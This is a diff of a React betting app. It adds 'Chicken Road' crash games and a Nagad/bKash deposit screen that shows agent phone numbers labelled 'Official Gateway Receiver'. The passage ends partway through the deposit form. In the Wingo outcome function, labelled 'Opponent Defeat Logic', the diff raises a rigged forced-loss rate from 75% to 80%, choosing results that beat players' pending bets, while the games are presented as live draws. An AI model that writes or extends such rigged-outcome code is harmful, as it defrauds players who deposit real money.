@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -345,6 +344,10 @@
             return history;
         };
 
+        // Multipliers lists for the new Chicken Road games
+        const chickenRoadMultipliers = [1.03, 1.07, 1.12, 1.17, 1.23, 1.29, 1.36, 1.44, 1.53];
+        const chickenRoad2Multipliers = [1.01, 1.03, 1.06, 1.10, 1.15, 1.19, 1.24, 1.30, 1.37];
+
         function App() {
             const [view, setView] = useState('auth'); 
             const [authTab, setAuthTab] = useState('login'); 
@@ -355,7 +358,7 @@
             const [isLoading, setIsLoading] = useState(false);
 
             // Active Game States
-            const [gameType, setGameType] = useState('wingo'); // 'wingo' or 'trx_wingo'
+            const [gameType, setGameType] = useState('wingo'); // 'wingo' | 'trx_wingo' | 'chicken_road' | 'chicken_road_2'
 
             // Pagination state for Game History lists
             const [historyPage, setHistoryPage] = useState(1);
@@ -375,12 +378,14 @@
             const [confirmPassword, setConfirmPassword] = useState('');
             const [promoCode, setPromoCode] = useState('');
 
-            // Deposit Form States
+            // Deposit Form States & Channel Modifiers
             const [depositAmount, setDepositAmount] = useState('500');
             const [senderNumber, setSenderNumber] = useState('');
             const [transactionId, setTransactionId] = useState('');
             const [isDepositing, setIsDepositing] = useState(false);
             const [depositTab, setDepositTab] = useState('new'); 
+            const [selectedMethod, setSelectedMethod] = useState('nagad'); // 'nagad' | 'bkash' (USDT Removed)
+            const [selectedChannel, setSelectedChannel] = useState('GoPay-Nagad');
 
             // Withdrawal Wallet States
             const [withdrawAmount, setWithdrawAmount] = useState('500');
@@ -420,6 +425,13 @@
             const [drawHistoryTrx30s, setDrawHistoryTrx30s] = useState(generateTrxMockHistory('20260709103010419', 50));
             const [drawHistoryTrx1m, setDrawHistoryTrx1m] = useState(generateTrxMockHistory('20260709203010201', 50));
             const [drawHistoryTrx2m, setDrawHistoryTrx2m] = useState(generateTrxMockHistory('20260709303010101', 50));
+
+            // Chicken Road Dynamic State Engines
+            const [chickenActive, setChickenActive] = useState(false);
+            const [chickenStep, setChickenStep] = useState(-1);
+            const [chickenBet, setChickenBet] = useState(10);
+            const [chickenDifficulty, setChickenDifficulty] = useState('easy'); // 'easy' | 'medium' | 'hard' | 'hardcore'
+            const [chickenCrash, setChickenCrash] = useState(false);
 
             // Betting Board States
             const [betValue, setBetValue] = useState(null);
@@ -582,7 +594,7 @@
                 }
             }, [timer30s, timer1m, timer2m, activeGameTab, view]);
 
-            // Opponent Defeat Logic set to 75% lose, 25% profit
+            // Opponent Defeat Logic adjusted to exactly 80% lose (20% strict win rate)
             const determineOutcomeWithLossParameters = (game, mode, currentPeriod) => {
                 const activeBets = (myBetsRef.current || []).filter(b => b.gameType === game && b.mode === mode && b.period === currentPeriod && b.status === 'pending');
                 
@@ -592,8 +604,8 @@
 
                 const controlRoll = Math.random() * 100;
 
-                // 75% lose control parameter
-                if (controlRoll <= 75) {
+                // Exactly 80% forced loss (20% win rate)
+                if (controlRoll <= 80) {
                     const userWinStates = new Set();
                     activeBets.forEach(bet => {
                         const selection = typeof bet.selection === 'string' ? bet.selection.toLowerCase() : bet.selection;
@@ -792,6 +804,121 @@
                 return () => clearInterval(clockInterval);
             }, []);
 
+            // Chicken Road gameplay actions
+            const activeChickenMults = gameType === 'chicken_road' ? chickenRoadMultipliers : chickenRoad2Multipliers;
+
+            const startChickenGame = () => {
+                if (chickenBet <= 0) {
+                    showToast('Please enter a valid bet amount!', 'error');
+                    return;
+                }
+                if (chickenBet > balance) {
+                    showToast('Insufficient balance!', 'error');
+                    return;
+                }
+
+                const nextBalance = balance - chickenBet;
+                setBalance(nextBalance);
+                setChickenActive(true);
+                setChickenStep(0);
+                setChickenCrash(false);
+
+                if (currentUser) {
+                    const dbPath = 'users/' + getSanitizedPath(currentUser.phone);
+                    db.ref(dbPath).update({
+                        balance: nextBalance
+                    });
+                }
+                showToast(`Game started! Bet: ৳${chickenBet}`, 'success');
+            };
+
+            const handleChickenStep = () => {
+                if (!chickenActive) return;
+
+                let successThreshold = 92; // easy
+                if (chickenDifficulty === 'medium') successThreshold = 80;
+                else if (chickenDifficulty === 'hard') successThreshold = 60;
+                else if (chickenDifficulty === 'hardcore') successThreshold = 40;
+
+                const roll = Math.random() * 100;
+                if (roll < successThreshold) {
+                    const nextStep = chickenStep + 1;
+                    setChickenStep(nextStep);
+                    playCountdownBeep(false);
+
+                    // Automatic max-out cashout on 9th lane completion
+                    if (nextStep === 8) {
+                        const maxMult = activeChickenMults[8];
+                        const winAmt = chickenBet * maxMult;
+                        handleChickenCashout(winAmt);
+                    }
+                } else {
+                    setChickenCrash(true);
+                    setChickenActive(false);
+                    playCountdownBeep(true);
+
+                    const newBetLog = {
+                        id: Date.now(),
+                        period: 'N/A',
+                        mode: chickenDifficulty.toUpperCase(),
+                        gameType: gameType,
+                        selection: 'Step ' + (chickenStep + 1),
+                        amount: chickenBet,
+                        status: 'lost',
+                        timestamp: new Date().toLocaleTimeString()
+                    };
+
+                    const nextBets = [newBetLog, ...(myBets || [])];
+                    setMyBets(nextBets);
+
+                    if (currentUser) {
+                        const dbPath = 'users/' + getSanitizedPath(currentUser.phone);
+                        db.ref(dbPath).update({
+                            bets: nextBets
+                        });
+                    }
+                }
+            };
+
+            const handleChickenCashout = (forcedAmount = null) => {
+                if (!chickenActive && forcedAmount === null) return;
+
+                const currentMult = activeChickenMults[chickenStep];
+                const winAmt = forcedAmount !== null ? forcedAmount : (chickenBet * currentMult);
+                const nextBalance = balance + winAmt;
+
+                setBalance(nextBalance);
+                setChickenActive(false);
+                setChickenStep(-1);
+
+                const newBetLog = {
+                    id: Date.now(),
+                    period: 'N/A',
+                    mode: chickenDifficulty.toUpperCase(),
+                    gameType: gameType,
+                    selection: 'Cashout x' + currentMult,
+                    amount: chickenBet,
+                    status: 'won',
+                    payout: winAmt,
+                    timestamp: new Date().toLocaleTimeString()
+                };
+
+                const nextBets = [newBetLog, ...(myBets || [])];
+                setMyBets(nextBets);
+
+                if (currentUser) {
+                    const dbPath = 'users/' + getSanitizedPath(currentUser.phone);
+                    db.ref(dbPath).update({
+                        balance: nextBalance,
+                        bets: nextBets
+                    });
+                }
+
+                setPopupAmount(winAmt);
+                setPopupType('win');
+                setShowResultPopup(true);
+            };
+
             const handleSignupSubmit = (e) => {
                 e.preventDefault();
                 if (!phone || !username || !password || !confirmPassword) {
@@ -923,7 +1050,7 @@
                     return;
                 }
                 if (!senderNumber || senderNumber.length < 10) {
-                    showToast('Enter valid sender bKash number', 'error');
+                    showToast('Enter valid sender account details', 'error');
                     return;
                 }
                 if (!transactionId || transactionId.length < 8) {
@@ -942,7 +1069,8 @@
                     status: 'Pending', 
                     timestamp: new Date().toLocaleString(),
                     userPhone: currentUser.phone,
-                    username: currentUser.username
+                    username: currentUser.username,
+                    gateway: selectedChannel
                 };
 
                 const userPath = 'users/' + getSanitizedPath(currentUser.phone) + '/deposits/' + depositId;
@@ -1325,36 +1453,25 @@
                                             
                                             {/* Game Card 1: WINGO */}
                                             <div onClick={() => { setGameType('wingo'); setView('game'); }} className="relative h-44 rounded-2xl bg-gradient-to-br from-[#1b8a43] to-[#0c5926] shadow-md border border-emerald-800 cursor-pointer overflow-hidden active:scale-95 transition-all flex flex-col justify-between p-4">
-                                                
-                                                {/* Ambient curve background effect */}
                                                 <div className="absolute inset-0 opacity-10 bg-[radial-gradient(circle_at_top_right,white,transparent_50%)]"></div>
-                                                
-                                                {/* Card Header Labels */}
                                                 <div className="flex justify-between items-start z-10">
                                                     <span className="text-[10px] bg-emerald-900/60 border border-emerald-700 text-emerald-200 px-2.5 py-0.5 rounded-full font-bold uppercase tracking-wider">Classic Live</span>
                                                     <span className="text-[10px] font-black text-[#fccd11] tracking-wide font-mono">WINGO 30s/1m/2m</span>
                                                 </div>
 
-                                                {/* Graphical Elements recreating WINGO logo layout from image */}
                                                 <div className="absolute right-6 top-8 w-28 h-24 pointer-events-none flex items-center justify-center">
-                                                    {/* Red Sphere '9' */}
                                                     <div className="absolute -top-1 right-2 w-14 h-14 rounded-full bg-gradient-to-br from-red-400 via-red-500 to-red-600 border border-white/20 shadow-lg flex items-center justify-center">
                                                         <div className="absolute inset-0 bg-white/10 rounded-full" style={{ clipPath: 'polygon(0 0, 100% 0, 100% 50%, 0 50%)' }}></div>
                                                         <span className="text-white text-2xl font-black tracking-tighter drop-shadow-md">9</span>
                                                     </div>
-
-                                                    {/* Violet Sphere '0' */}
                                                     <div className="absolute bottom-2 right-1 w-11 h-11 rounded-full bg-gradient-to-br from-violet-400 via-violet-500 to-indigo-600 border border-white/20 shadow-lg flex items-center justify-center">
                                                         <span className="text-white text-xl font-black tracking-tighter drop-shadow-md">0</span>
                                                     </div>
-
-                                                    {/* Teal Sphere '4' */}
                                                     <div className="absolute bottom-4 left-2 w-10 h-10 rounded-full bg-gradient-to-br from-teal-300 via-emerald-400 to-emerald-500 border border-white/20 shadow-lg flex items-center justify-center">
                                                         <span className="text-white text-lg font-black tracking-tighter drop-shadow-md">4</span>
                                                     </div>
                                                 </div>
 
-                                                {/* Footer branding of Wingo */}
                                                 <div className="z-10 mt-auto">
                                                     <h2 className="text-xl font-black text-white tracking-widest font-sans uppercase">Wingo</h2>
                                                     <span className="text-[10px] text-emerald-200 block mt-0.5">Classic Color Prediction Game</span>
@@ -1363,37 +1480,66 @@
 
                                             {/* Game Card 2: TRX WINGO */}
                                             <div onClick={() => { setGameType('trx_wingo'); setView('game'); }} className="relative h-44 rounded-2xl bg-gradient-to-br from-[#1b8a43] to-[#0c5926] shadow-md border border-emerald-800 cursor-pointer overflow-hidden active:scale-95 transition-all flex flex-col justify-between p-4">
-                                                
-                                                {/* Ambient curve background effect */}
                                                 <div className="absolute inset-0 opacity-10 bg-[radial-gradient(circle_at_top_right,white,transparent_50%)]"></div>
-                                                
-                                                {/* Card Header Labels */}
                                                 <div className="flex justify-between items-start z-10">
                                                     <span className="text-[10px] bg-emerald-900/60 border border-emerald-700 text-emerald-200 px-2.5 py-0.5 rounded-full font-bold uppercase tracking-wider">TRX Hash Live</span>
                                                     <span className="text-[10px] font-black text-[#fccd11] tracking-wide font-mono">TRON Block</span>
                                                 </div>
 
-                                                {/* Graphical Elements recreating TRX WINGO layout */}
                                                 <div className="absolute right-6 top-8 w-28 h-24 pointer-events-none flex items-center justify-center">
-                                                    {/* Backdrop Pink Pattern Circle */}
                                                     <div className="absolute right-2 top-2 w-7 h-7 rounded-full bg-gradient-to-br from-pink-400 to-rose-600 opacity-80 blur-[0.2px]"></div>
-                                                    
-                                                    {/* Central Red 3D Tron pyramid symbol */}
                                                     <div className="relative z-10 w-12 h-14 bg-gradient-to-b from-red-500 to-red-800 shadow-lg" style={{ clipPath: 'polygon(50% 0%, 100% 100%, 0% 100%)' }}>
                                                         <div className="absolute inset-0 bg-red-400/30" style={{ clipPath: 'polygon(50% 0%, 50% 100%, 0% 100%)' }}></div>
                                                     </div>
-
-                                                    {/* Orange Sphere 'T' */}
                                                     <div className="absolute bottom-2 -right-1 w-8 h-8 rounded-full bg-gradient-to-tr from-amber-500 to-yellow-300 flex items-center justify-center font-black text-white text-xs border border-white/25 shadow-md">T</div>
-
-                                                    {/* Green Sphere 'R' */}
                                                     <div className="absolute bottom-2 left-0 w-7 h-7 rounded-full bg-gradient-to-tr from-emerald-500 to-teal-300 flex items-center justify-center font-black text-white text-xs border border-white/25 shadow-md">R</div>
                                                 </div>
 
-                                                {/* Footer branding of TRX Wingo */}
                                                 <div className="z-10 mt-auto">
                                                     <h2 className="text-xl font-black text-white tracking-widest font-sans uppercase">TRX Wingo</h2>
                                                     <span className="text-[10px] text-emerald-200 block mt-0.5">Hash Block Color Prediction</span>
+                                                </div>
+                                            </div>
+
+                                            {/* Game Card 3: CHICKEN ROAD (NEW!) */}
+                                            <div onClick={() => { setGameType('chicken_road'); setView('game_chicken'); setChickenActive(false); setChickenStep(-1); setChickenCrash(false); }} className="relative h-44 rounded-2xl bg-gradient-to-br from-indigo-900 to-slate-900 shadow-md border border-indigo-950 cursor-pointer overflow-hidden active:scale-95 transition-all flex flex-col justify-between p-4">
+                                                <div className="absolute inset-0 opacity-15 bg-[radial-gradient(circle_at_top_right,white,transparent_50%)]"></div>
+                                                <div className="flex justify-between items-start z-10">
+                                                    <span className="text-[10px] bg-indigo-800/60 border border-indigo-700 text-indigo-200 px-2.5 py-0.5 rounded-full font-bold uppercase tracking-wider">Crash Lane</span>
+                                                    <span className="text-[10px] font-black text-[#fccd11] tracking-wide font-mono">MULTIPLIER</span>
+                                                </div>
+
+                                                <div className="absolute right-6 top-8 w-28 h-24 pointer-events-none flex items-center justify-center">
+                                                    {/* Graphical Sewer Grate Cover representation */}
+                                                    <div className="w-14 h-14 rounded-full bg-slate-800 border-4 border-slate-600 flex items-center justify-center shadow-lg">
+                                                        <span className="text-xs font-bold text-[#fccd11] animate-bounce">🐔</span>
+                                                    </div>
+                                                </div>
+
+                                                <div className="z-10 mt-auto">
+                                                    <h2 className="text-xl font-black text-white tracking-widest font-sans uppercase">Chicken Road</h2>
+                                                    <span className="text-[10px] text-indigo-200 block mt-0.5">Avoid Obstacles & Cash Out Big</span>
+                                                </div>
+                                            </div>
+
+                                            {/* Game Card 4: CHICKEN ROAD 2 (NEW!) */}
+                                            <div onClick={() => { setGameType('chicken_road_2'); setView('game_chicken'); setChickenActive(false); setChickenStep(-1); setChickenCrash(false); }} className="relative h-44 rounded-2xl bg-gradient-to-br from-emerald-800 to-teal-950 shadow-md border border-emerald-950 cursor-pointer overflow-hidden active:scale-95 transition-all flex flex-col justify-between p-4">
+                                                <div className="absolute inset-0 opacity-15 bg-[radial-gradient(circle_at_top_right,white,transparent_50%)]"></div>
+                                                <div className="flex justify-between items-start z-10">
+                                                    <span className="text-[10px] bg-emerald-700/60 border border-emerald-600 text-emerald-200 px-2.5 py-0.5 rounded-full font-bold uppercase tracking-wider">Traffic Crossing</span>
+                                                    <span className="text-[10px] font-black text-[#fccd11] tracking-wide font-mono">CAR CRASH 2</span>
+                                                </div>
+
+                                                <div className="absolute right-6 top-6 w-28 h-24 pointer-events-none flex items-center justify-center">
+                                                    <div className="relative w-12 h-16 bg-yellow-500 rounded-md border-2 border-slate-900 shadow-md flex items-center justify-center">
+                                                        <div className="absolute top-1 inset-x-1.5 h-3 bg-slate-800 rounded-sm"></div>
+                                                        <span className="text-base text-slate-800 font-extrabold z-10">🚚</span>
+                                                    </div>
+                                                </div>
+
+                                                <div className="z-10 mt-auto">
+                                                    <h2 className="text-xl font-black text-white tracking-widest font-sans uppercase">Chicken Road 2</h2>
+                                                    <span className="text-[10px] text-emerald-200 block mt-0.5">Highway Traffic Survival Game</span>
                                                 </div>
                                             </div>
 
@@ -1458,17 +1604,14 @@
                                     {/* NAVIGATION SUB-VIEW: ACCOUNT */}
                                     {activeNav === 'account' && (
                                         <div className="flex flex-col bg-[#f5f6fa]">
-                                            <div className="bg-gradient-to-b from-indigo-950 to-slate-950 text-white px-6 py-8 rounded-b-[2.5rem] shadow-md flex flex-col items-center">
-                                                
+                                            <div className="bg-gradient-to-b from-indigo-950 to-slate-955 text-white px-6 py-8 rounded-b-[2.5rem] shadow-md flex flex-col items-center">
                                                 <div className="w-14 h-14 bg-[#8a2be2]/10 border border-[#8a2be2]/40 flex items-center justify-center rounded-2xl mb-3 shadow-md">
                                                     <span className="text-3xl font-black text-[#fccd11]">S</span>
                                                 </div>
-
                                                 <h2 className="text-sm font-bold mt-1">{currentUser ? currentUser.username : 'Guest User'}</h2>
                                                 <p className="text-[11px] text-slate-400 mt-0.5">Phone: {currentUser ? currentUser.phone : 'Not Verified'}</p>
                                             </div>
 
-                                            {/* WARNING NOTIFICATION PANEL: PENDING WITHDRAW */}
                                             {hasPendingWithdraw && (
                                                 <div className="mx-4 mt-4 p-3 bg-amber-500/10 border border-amber-500/30 rounded-xl flex items-center space-x-3 text-amber-800 animate-pulse">
                                                     <Icon name="info" className="w-5 h-5 text-amber-600 flex-shrink-0" />
@@ -1482,15 +1625,15 @@
                                                 <button onClick={() => { setView('deposit'); setDepositTab('new'); }} className="w-full bg-white hover:bg-slate-50 text-slate-800 py-4 px-4 rounded-xl shadow-sm flex items-center justify-between border border-slate-100 transition-colors">
                                                     <div className="flex items-center space-x-3">
                                                         <Icon name="wallet" className="w-5 h-5 text-[#8a2be2]" />
-                                                        <span className="text-xs font-bold text-slate-800 font-sans">bKash Fast Deposit</span>
+                                                        <span className="text-xs font-bold text-slate-800 font-sans">Fast Deposit Gateway</span>
                                                     </div>
-                                                    <span className="text-[9px] bg-rose-50 text-rose-600 py-1 px-2.5 rounded-full font-bold">Add BDT</span>
+                                                    <span className="text-[9px] bg-rose-50 text-rose-600 py-1 px-2.5 rounded-full font-bold">Add Funds</span>
                                                 </button>
 
                                                 <button onClick={() => { setView('withdraw'); setWithdrawTab('new'); }} className="w-full bg-white hover:bg-slate-50 text-slate-800 py-4 px-4 rounded-xl shadow-sm flex items-center justify-between border border-slate-100 transition-colors relative">
                                                     <div className="flex items-center space-x-3">
                                                         <Icon name="wallet" className="w-5 h-5 text-emerald-600" />
-                                                        <span className="text-xs font-bold text-slate-800 font-sans">bKash Fast Withdraw</span>
+                                                        <span className="text-xs font-bold text-slate-800 font-sans">Fast Withdraw</span>
                                                     </div>
                                                     <div className="flex items-center space-x-2">
                                                         {hasPendingWithdraw && <span className="w-2.5 h-2.5 bg-amber-500 rounded-full animate-ping"></span>}
@@ -1545,134 +1688,278 @@
                             </div>
                         )}
 
-                        {/* VIEW: BKASH DEPOSIT SCREEN */}
+                        {/* VIEW: PROFESSIONAL DEPOSIT SCREEN (USDT REMOVED) */}
                         {view === 'deposit' && (
-                            <div className="flex-1 flex flex-col bg-slate-50 justify-between overflow-y-auto">
-                                <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100">
+                            <div className="flex-1 flex flex-col bg-[#f5f6fa] h-full justify-between overflow-hidden">
+                                <div className="bg-white px-4 py-3 flex items-center justify-between border-b border-gray-100 flex-shrink-0">
                                     <div className="flex items-center">
                                         <button onClick={() => setView('home')} className="text-slate-700 hover:text-black mr-2">
                                             <Icon name="chevron-left" className="w-6 h-6" />
                                         </button>
-                                        <h1 className="text-sm font-bold text-slate-800">bKash Deposit Portal</h1>
                                     </div>
-                                    
-                                    <div className="flex space-x-1.5">
-                                        <button onClick={() => setDepositTab('new')} className={`px-2.5 py-1 rounded text-[10px] font-bold ${depositTab === 'new' ? 'bg-[#e2136e] text-white' : 'bg-slate-100 text-slate-600'}`}>New</button>
-                                        <button onClick={() => setDepositTab('history')} className={`px-2.5 py-1 rounded text-[10px] font-bold ${depositTab === 'history' ? 'bg-[#e2136e] text-white' : 'bg-slate-100 text-slate-600'}`}>History</button>
-                                    </div>
+                                    <h1 className="text-base font-bold text-slate-800 font-sans">Deposit</h1>
+                                    <button 
+                                        onClick={() => setDepositTab(depositTab === 'new' ? 'history' : 'new')} 
+                                        className="text-xs font-bold text-slate-600 hover:text-[#8a2be2]"
+                                    >
+                                        {depositTab === 'new' ? 'Deposit history' : 'New Deposit'}
+                                    </button>
                                 </div>
 
-                                <div className="flex-1 p-4 space-y-4">
-                                    {depositTab === 'new' ? (
-                                        <>
-                                            <div className="bg-white p-5 rounded-2xl border border-slate-100 shadow-sm space-y-3">
-                                                <div className="flex justify-between items-center pb-2 border-b border-slate-50">
-                                                    <BkashOfficialLogo />
-                                                    <span className="text-[9px] font-bold bg-rose-100 text-[#e2136e] px-2 py-0.5 rounded-full uppercase">Official Wallet</span>
+                                {depositTab === 'new' ? (
+                                    <div className="flex-1 overflow-y-auto pb-24">
+                                        {/* 1. Yellow Gradient Balance Card */}
+                                        <div className="p-4">
+                                            <div className="bg-gradient-to-br from-amber-400 to-yellow-500 rounded-2xl p-5 shadow-sm text-slate-950 relative overflow-hidden">
+                                                <div className="absolute right-0 bottom-0 translate-y-4 translate-x-4 opacity-10">
+                                                    <Icon name="wallet" className="w-32 h-32 text-slate-950" />
                                                 </div>
-                                                
-                                                <div className="p-3 bg-rose-50/50 rounded-xl border border-rose-100 space-y-2">
-                                                    <div className="flex items-center justify-between">
-                                                        <div>
-                                                            <span className="text-[10px] text-slate-500 block">bKash SendMoney Agent:</span>
-                                                            <span className="text-sm font-black text-slate-800 font-mono">01860909272</span>
-                                                        </div>
-                                                        <button 
-                                                            onClick={() => { navigator.clipboard.writeText('01860909272'); showToast('Number copied!', 'success'); }} 
-                                                            className="px-3.5 py-1.5 bg-[#e2136e] text-white rounded-lg text-[10px] font-bold"
-                                                        >
-                                                            Copy Number
-                                                        </button>
-                                                    </div>
+                                                <div className="flex items-center space-x-1.5 opacity-80 text-xs font-semibold">
+                                                    <Icon name="wallet" className="w-4 h-4" />
+                                                    <span>Balance</span>
+                                                </div>
+                                                <div className="text-3xl font-black mt-1 tracking-tight flex items-center space-x-2">
+                                                    <span>৳{Number(balance || 0).toFixed(2)}</span>
+                                                    <button onClick={() => window.location.reload()} className="hover:rotate-180 transition-transform duration-350">
+                                                        <Icon name="refresh-cw" className="w-4 h-4 text-slate-950/75" />
+                                                    </button>
                                                 </div>
                                             </div>
+                                        </div>
 
-                                            <form onSubmit={processDeposit} className="space-y-4">
-                                                <div>
-                                                    <label className="block text-slate-500 text-[10px] font-bold uppercase mb-1.5">Deposit Amount (Minimum ৳100)</label>
-                                                    <div className="grid grid-cols-4 gap-2">
-                                                        {['200', '500', '1000', '5000'].map(val => (
-                                                            <button 
-                                                                type="button" 
-                                                                key={val} 
-                                                                onClick={() => setDepositAmount(val)} 
-                                                                className={`py-2 text-xs font-bold rounded-xl border transition-all ${depositAmount === val ? 'bg-[#e2136e] text-white border-transparent' : 'bg-white border-slate-200 text-slate-600'}`}
-                                                            >
-                                                                ৳{val}
-                                                            </button>
-                                                        ))}
-                                                    </div>
-                                                    <input 
-                                                        type="number" 
-                                                        placeholder="Enter Custom Amount" 
-                                                        value={depositAmount} 
-                                                        onChange={e => setDepositAmount(e.target.value)} 
-                                                        className="w-full mt-2 bg-white border border-slate-200 rounded-xl py-3 px-4 text-xs font-bold text-slate-800 focus:outline-none"
-                                                    />
+                                        {/* 2. Professional Payment Method Tabs (USDT removed, grid-cols-2) */}
+                                        <div className="px-4 pb-3 grid grid-cols-2 gap-3">
+                                            {/* Nagad Method Tab */}
+                                            <button 
+                                                onClick={() => { setSelectedMethod('nagad'); setSelectedChannel('GoPay-Nagad'); }} 
+                                                className={`p-3 rounded-xl bg-white border-2 flex flex-col items-center justify-center space-y-1.5 shadow-sm transition-all ${
+                                                    selectedMethod === 'nagad' ? 'border-[#fccd11] bg-yellow-50/20' : 'border-transparent'
+                                                }`}
+                                            >
+                                                <div className="w-10 h-10 rounded-full bg-gradient-to-tr from-orange-500 to-amber-500 flex items-center justify-center text-white text-xs font-bold font-sans">
+                                                    N
+                                                </div>
+                                                <span className="text-xs font-bold text-slate-700 font-sans">Nagad</span>
+                                            </button>
+
+                                            {/* bKash Method Tab */}
+                                            <button 
+                                                onClick={() => { setSelectedMethod('bkash'); setSelectedChannel('GoPay-bKash'); }} 
+                                                className={`p-3 rounded-xl bg-white border-2 flex flex-col items-center justify-center space-y-1.5 shadow-sm transition-all ${
+                                                    selectedMethod === 'bkash' ? 'border-[#e2136e] bg-rose-50/20' : 'border-transparent'
+                                                }`}
+                                            >
+                                                <div className="w-10 h-10 rounded-xl bg-[#e2136e] flex items-center justify-center">
+                                                    <span className="text-white font-extrabold text-base">b</span>
+                                                </div>
+                                                <span className="text-xs font-bold text-slate-700 font-sans">bKash</span>
+                                            </button>
+                                        </div>
+
+                                        {/* 3. Select Channel Section */}
+                                        <div className="px-4 pb-4 font-sans">
+                                            <div className="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 space-y-3">
+                                                <div className="flex items-center space-x-1.5 text-slate-700 font-bold text-sm">
+                                                    <Icon name="percent" className="w-4 h-4 text-amber-500" />
+                                                    <span>Select channel</span>
                                                 </div>
 
-                                                <div>
-                                                    <label className="block text-slate-500 text-[10px] font-bold uppercase mb-1">Your Sender bKash Number</label>
+                                                <div className="grid grid-cols-2 gap-2">
+                                                    {selectedMethod === 'nagad' && (
+                                                        <>
+                                                            <button 
+                                                                onClick={() => setSelectedChannel('GoPay-Nagad')}
+                                                                className={`p-3 text-left rounded-xl transition-all border ${
+                                                                    selectedChannel === 'GoPay-Nagad' ? 'bg-[#fccd11] border-transparent text-slate-955 font-bold shadow-sm' : 'bg-slate-50 border-slate-200 text-slate-600'
+                                                                }`}
+                                                            >
+                                                                <div className="text-[11px] font-extrabold">GoPay-Nagad</div>
+                                                                <div className="text-[9px] opacity-80 mt-0.5 font-semibold">Balance:100 - 50K</div>
+                                                            </button>
+                                                            <button 
+                                                                onClick={() => setSelectedChannel('RolezPay-nagad')}
+                                                                className={`p-3 text-left rounded-xl transition-all border ${
+                                                                    selectedChannel === 'RolezPay-nagad' ? 'bg-[#fccd11] border-transparent text-slate-955 font-bold shadow-sm' : 'bg-slate-50 border-slate-200 text-slate-600'
+                                                                }`}
+                                                            >
+                                                                <div className="text-[11px] font-extrabold">RolezPay-nagad</div>
+                                                                <div className="text-[9px] opacity-80 mt-0.5 font-semibold">Balance:100 - 30K</div>
+                                                            </button>
+                                                            <button 
+                                                                onClick={() => setSelectedChannel('StarPago-NAGAD')}
+                                                                className={`p-3 text-left rounded-xl transition-all border ${
+                                                                    selectedChannel === 'StarPago-NAGAD' ? 'bg-[#fccd11] border-transparent text-slate-955 font-bold shadow-sm' : 'bg-slate-50 border-slate-200 text-slate-600'
+                                                                }`}
+                                                            >
+                                                                <div className="text-[11px] font-extrabold">StarPago-NAGAD</div>
+                                                                <div className="text-[9px] opacity-80 mt-0.5 font-semibold">Balance:100 - 5K</div>
+                                                            </button>
+                                                        </>
+                                                    )}
+
+                                                    {selectedMethod === 'bkash' && (
+                                                        <>
+                                                            <button 
+                                                                onClick={() => setSelectedChannel('GoPay-bKash')}
+                                                                className={`p-3 text-left rounded-xl transition-all border ${
+                                                                    selectedChannel === 'GoPay-bKash' ? 'bg-[#e2136e] border-transparent text-white font-bold shadow-sm' : 'bg-slate-50 border-slate-200 text-slate-600'
+                                                                }`}
+                                                            >
+                                                                <div className="text-[11px] font-extrabold">GoPay-bKash</div>
+                                                                <div className="text-[9px] opacity-85 mt-0.5 font-semibold">Balance:100 - 50K</div>
+                                                            </button>
+                                                            <button 
+                                                                onClick={() => setSelectedChannel('StarPago-bKash')}
+                                                                className={`p-3 text-left rounded-xl transition-all border ${
+                                                                    selectedChannel === 'StarPago-bKash' ? 'bg-[#e2136e] border-transparent text-white font-bold shadow-sm' : 'bg-slate-50 border-slate-200 text-slate-600'
+                                                                }`}
+                                                            >
+                                                                <div className="text-[11px] font-extrabold">StarPago-bKash</div>
+                                                                <div className="text-[9px] opacity-85 mt-0.5 font-semibold">Balance:100 - 10K</div>
+                                                            </button>
+                                                        </>
+                                                    )}
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        {/* 4. Active Agent Number Copy Panel */}
+                                        <div className="px-4 pb-4 font-sans">
+                                            <div className="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 space-y-2.5">
+                                                <span className="text-[10px] text-slate-400 font-bold uppercase tracking-wider block">Official Gateway Receiver details:</span>
+                                                <div className="p-3 bg-slate-50 rounded-xl border border-slate-200/60 flex items-center justify-between">
+                                                    <div>
+                                                        <span className="text-[9px] text-slate-500 block">Agent Account:</span>
+                                                        <span className="text-sm font-black text-slate-800 font-mono select-all">
+                                                            {selectedMethod === 'nagad' ? '01910203040' : '01860909272'}
+                                                        </span>
+                                                    </div>
+                                                    <button 
+                                                        type="button"
+                                                        onClick={() => {
+                                                            const val = selectedMethod === 'nagad' ? '01910203040' : '01860909272';
+                                                            navigator.clipboard.writeText(val);
+                                                            showToast('Receiver copied!', 'success');
+                                                        }} 
+                                                        className="px-3.5 py-1.5 bg-slate-800 hover:bg-slate-900 text-white rounded-lg text-[10px] font-bold"
+                                                    >
+                                                        Copy
+                                                    </button>
+                                                </div>
+                                            </div>
+                                        </div>
+
+                                        {/* 5. Deposit Amount Selector Section */}
+                                        <div className="px-4 pb-4 font-sans">
+                                            <div className="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 space-y-3">
+                                                <div className="flex items-center space-x-1.5 text-slate-700 font-bold text-sm">
+                                                    <Icon name="wallet" className="w-4 h-4 text-emerald-500" />
+                                                    <span>Deposit amount</span>
+                                                </div>
+
+                                                <div className="grid grid-cols-4 gap-2">
+                                                    {['200', '500', '1000', '5000'].map(val => (
+                                                        <button 
+                                                            type="button" 
+                                                            key={val} 
+                                                            onClick={() => setDepositAmount(val)} 
+                                                            className={`py-2 text-xs font-bold rounded-xl border transition-all ${
+                                                                depositAmount === val ? 'bg-slate-900 text-white border-transparent' : 'bg-slate-50 border-slate-200 text-slate-600 hover:bg-slate-100'
+                                                            }`}
+                                                        >
+                                                            ৳{val}
+                                                        </button>
+                                                    ))}
+                                                </div>
+
+                                                <input 
+                                                    type="number" 
+                                                    placeholder="Enter Custom Amount (BDT)"
+                                                    value={depositAmount} 
+                                                    onChange={e => setDepositAmount(e.target.value)} 
+                                                    className="w-full mt-2 bg-slate-50 border border-slate-200 rounded-xl py-3 px-4 text-xs font-bold text-slate-800 focus:outline-none focus:ring-1 focus:ring-[#8a2be2]"
+                                                />
+                                            </div>
+                                        </div>
+
+                                        {/* 6. Transaction Details Validation Inputs */}
+                                        <div className="px-4 pb-4 font-sans">
+                                            <div className="bg-white p-4 rounded-2xl shadow-sm border border-slate-100 space-y-3">
+                                                <div className="flex items-center space-x-1.5 text-slate-700 font-bold text-sm">
+                                                    <Icon name="shield-check" className="w-4 h-4 text-indigo-500" />
